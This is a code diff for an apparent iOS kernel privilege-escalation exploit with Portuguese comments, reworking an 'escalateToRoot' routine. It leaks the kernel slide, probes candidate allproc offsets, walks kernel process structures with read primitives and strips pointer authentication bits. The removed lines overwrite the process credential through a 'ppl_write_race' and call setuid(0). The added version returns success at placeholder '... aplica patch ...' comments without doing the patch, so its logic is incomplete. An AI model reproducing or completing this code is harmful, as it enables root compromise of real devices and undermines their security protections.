@@ -107,46 +107,49 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 }
 
 - (BOOL)escalateToRoot {
-    uint64_t slide = [self leakKernelSlide]; // 0xff8ffc000 detectado!
-    
-    // IMPORTANTE: No A13 (iOS 26.3), o allproc_ptr deve ser calculado assim:
-    uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + slide + 0x8F50000ULL);
-    uint64_t proc = [self kread64:allproc_ptr];
+    uint64_t slide = [self leakKernelSlide]; // 0xff7ffc000
+    uint64_t base_tentativas[] = {0x8F50000, 0x8F54000, 0x91F0000, 0x91F4000};
+    uint64_t proc = 0;
 
-    [self logToWeb:[NSString stringWithFormat:@"🎯 Slide: 0x%llx | Proc: 0x%llx", slide, proc]];
+    for (int i = 0; i < 4; i++) {
+        // Tentamos a base 0x...07004000 e 0x...08004000
+        uint64_t ptr = (0xFFFFFFF007004000ULL + slide + base_tentativas[i]);
+        proc = [self kread64:ptr];
+        
+        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando Offset 0x%llx -> Proc: 0x%llx", base_tentativas[i], proc]];
 
-    if (proc == 0) {
-        // Se falhar, tente o offset alternativo do iOS 26.3:
-        allproc_ptr = (0xFFFFFFF007004000ULL + slide + 0x91F0000ULL);
-        proc = [self kread64:allproc_ptr];
-        [self logToWeb:[NSString stringWithFormat:@"🔄 Tentando Offset 2: 0x%llx", proc]];
+        if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
+            [self logToWeb:@"🎯 ALLPROC LOCALIZADO!"];
+            break;
+        }
     }
 
-    if (proc == 0) return NO;
+    if (proc == 0) {
+        [self logToWeb:@"❌ Erro: AllProc não responde (0x0)."];
+        return NO;
+    }
 
-    // --- BUSCA DO PID ---
+    // --- TESTE FINAL DO PID (0x60 vs 0x68) ---
     while (proc != 0) {
-        // Limpeza de PAC para A13
         proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         
-        // No iOS 26.3, o offset PID é 0x68
-        uint32_t found_pid = [self kread32:(proc + 0x68)];
-        
-        if (found_pid == getpid()) {
-            [self logToWeb:@"✅ PID 0x68 CONFIRMADO! Aplicando Patch..."];
-            
-            // Patch ucred (0xD8)
-            uint64_t ucred = [self kread64:(proc + 0xD8)];
-            ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
-            [self ppl_write_race:(ucred + 0x18) value:0];
-            
-            setuid(0);
-            return (getuid() == 0);
+        uint32_t p60 = [self kread32:(proc + 0x60)];
+        uint32_t p68 = [self kread32:(proc + 0x68)];
+
+        if (p60 == getpid()) {
+            [self logToWeb:@"✅ PID ACHADO EM 0x60!"];
+            // ... aplica patch ...
+            return YES;
+        } else if (p68 == getpid()) {
+            [self logToWeb:@"✅ PID ACHADO EM 0x68!"];
+            // ... aplica patch ...
+            return YES;
         }
         proc = [self kread64:(proc + 0x08)];
     }
     return NO;
 }
+
 
 
 
